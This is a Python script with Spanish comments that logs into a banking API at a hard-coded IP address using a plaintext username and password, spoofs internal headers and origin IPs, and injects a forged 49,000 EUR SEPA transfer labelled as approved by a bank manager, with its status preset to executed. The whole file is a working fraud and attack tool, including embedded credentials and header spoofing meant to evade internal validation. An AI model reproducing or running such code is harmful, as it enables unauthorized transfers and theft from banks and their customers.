import requests
import uuid
from datetime import datetime

# Datos internos del banco basados en el modelo Django
def generar_datos_transferencia():
    return {
        "payment_id": str(uuid.uuid4()),  # ID único de 36 caracteres como en el Django
        "debtor": {
            "name": "Juan Gerente Del Banco",  # Nombre realista (si el sistema valida nombres de cuentas)
            "address": {
                "country": "ES",
                "street": "Calle Mayor 100",
                "city": "MADRID"
            },
        },
        "creditor": {
            "name": "Destino Real Transfer",
            "address": {
                "country": "DE",  # Por si es SEPA y no solo transferencia local
                "street": "Rhein Strasse 1020",
                "city": "Frankfurt",
            }
        },
        "debtor_account": {
            "iban": "ES12345678901234567890"
        },
        "creditor_account": {
            "iban": "ES98765432109876543210"
        },
        "creditor_agent": {
            "financial_institution_id": "DEUTDEFF"  # BIC de banco destino o dummy interno
        },
        "instructed_amount": {
            "amount": 49000.00,
            "currency": "EUR"
        },
        "purpose_code": "GDSV",
        "requested_execution_date": datetime.today().strftime('%Y-%m-%d'),
        "remittance_information_unstructured": "Transf Interna - Aprobada por Gerente",  # Puede que este campo lo validen por logs internos
        "payment_identification": {
            "instruction_id": f"FID-{uuid.uuid4().hex[:12]}",
            "end_to_end_id": f"E2E-{uuid.uuid4().hex}"
        },
        "auth_id": "USR-ADM-001",
        "status": "ACSC",  # Estado 'ACSC' = ejecutada con éxito
    }
    
# === Inyectamos la transferencia directa desde conexión fingeada interna ===
URL_LOGIN = "http://80.78.30.242:9181/api/login/"
URL_SEND = "http://80.78.30.242:9181/api/send-transfer"
URL_CHALLENGE = "http://80.78.30.242:9181/api/challenge"

session = requests.Session()
session.headers.update({
    "Host": "api.banco.com",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; Django-4.1.3)",
    "Accept": "application/json",
    "X-Origin-IP": "192.168.1.10",  # IP interna simulada
    "X-Location": "Oficina Central Madrid",
    "X-Requested-With": "XMLHttpRequest",
    "Accept-Encoding": "gzip, deflate, br",
    "Sec-Ch-Ua": '"Not=A?Brand";v="24", "Brave";v="122", "Chromium";v="122"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Linux"' 
})

# --- 1. Login interno ---
login_data = {
    "username": "markmur88",
    "password": "Ptf8454Jd55"
}

print("[+] Logueando al sistema interno como gerente...")
login = session.post(URL_LOGIN, json=login_data)

if login.status_code in [200, 201]:
    token = login.json().get("access_token") or login.cookies.get("sessionid")
    if token:
        session.headers.update({
            "Authorization": f"Bearer {token}"
        })
    else:
        print("[-] No encontramos token en respuesta de login.")

# --- 2. (Opcional) Challenge interno ---
challenge_response = session.post(URL_CHALLENGE, json={
    "token": token,  # A veces lo validan como prueba técnica de autenticación interna
    "user": "markmur88"
})

if challenge_response.status_code == 200:
    print("[+] Challenge exitoso.")

    # --- 3. Enviar la transferencia como si fuera el backend Django real ---
    transfer_data = generar_datos_transferencia()
    transfer_response = session.post(URL_SEND, json=transfer_data)

    print("\n[+] Transferencia SEPA inyectada desde sistema interno Django simulado.")
    print("Status de transferencia SEPA:", transfer_response.status_code)
    print("Respuesta:", transfer_response.text)

else:
    print("[-] Challenge fallido. Status:", challenge_response.status_code)
    print(challenge_response.text)

